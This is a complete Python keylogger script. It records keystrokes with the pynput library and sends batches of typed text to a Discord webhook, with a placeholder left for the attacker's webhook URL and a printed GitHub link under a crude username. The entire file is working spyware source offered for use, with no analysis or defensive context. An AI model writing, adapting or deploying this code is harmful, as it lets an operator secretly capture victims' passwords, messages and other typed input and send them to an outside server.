import pynput
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook

# Replace with webhook!
webhook = ''
keys_buffer = ''


print("Started!")
print("https://github.com/underagechilderen")
def send(message):
    DiscordWebhook(url=webhook, content=message).execute()

def on_press(key):
    global keys_buffer
    if hasattr(key, 'char'):  
        key = key.char
    elif key == Key.space:  
        key = ' '
    elif key == Key.enter:  
        key = '\n'
    else:
        key = ''

    if key:  
        if len(keys_buffer) + len(key) >= 1975 or key == '\n':
            send(keys_buffer + key)
            keys_buffer = ''
        else:
            keys_buffer += key

with Listener(on_press=on_press) as listener:
    listener.join()